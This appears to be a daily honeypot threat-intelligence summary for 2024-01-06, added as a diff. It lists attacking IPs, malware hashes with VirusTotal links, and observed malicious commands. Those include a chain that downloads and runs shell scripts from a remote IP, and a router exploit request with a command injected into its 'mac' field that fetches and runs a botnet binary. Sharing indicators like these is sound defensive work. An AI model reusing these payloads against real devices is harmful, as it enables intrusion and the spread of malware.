@@ -1,0 +1,25 @@
+Top 5 IPs for 2024-01-06:
+
+64.23.143.217
+46.173.6.199
+5.144.8.53
+60.15.40.250
+159.203.61.80
+
+Malware download: 
+ea40ecec0b30982fbb1662e67f97f0e9d6f43d2d587f2f588525fae683abea73
+https://www.virustotal.com/gui/file/ea40ecec0b30982fbb1662e67f97f0e9d6f43d2d587f2f588525fae683abea73
+0db2c6afeb0ba8623c21f6f53783b2592fb6d20105ec0bf9a6b7fd4e59ae3712
+https://www.virustotal.com/gui/file/0db2c6afeb0ba8623c21f6f53783b2592fb6d20105ec0bf9a6b7fd4e59ae3712
+0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+https://www.virustotal.com/gui/file/0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+
+
+Malicious commands seen:
+
+cd /data/local/tmp/;busybox wget http://103.178.235.88/w.sh; sh w.sh; curl http://103.178.235.88/c.sh; sh c.sh; wget http://103.178.235.88/wget.sh; sh wget.sh; curl http://103.178.235.88/wget.sh; sh wget.sh; busybox wget http://103.178.235.88/wget.sh; sh wget.sh; busybox curl http://103.178.235.88/wget.sh; sh wget.sh
+
+POST /goform/set_LimitClient_cfg HTTP/1.1
+Cookie: user=admin
+
+time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf mpsl;wget http://103.180.149.62/skyljne.mpsl; chmod 777 skyljne.mpsl; ./skyljne.mpsl lblink.selfrep;
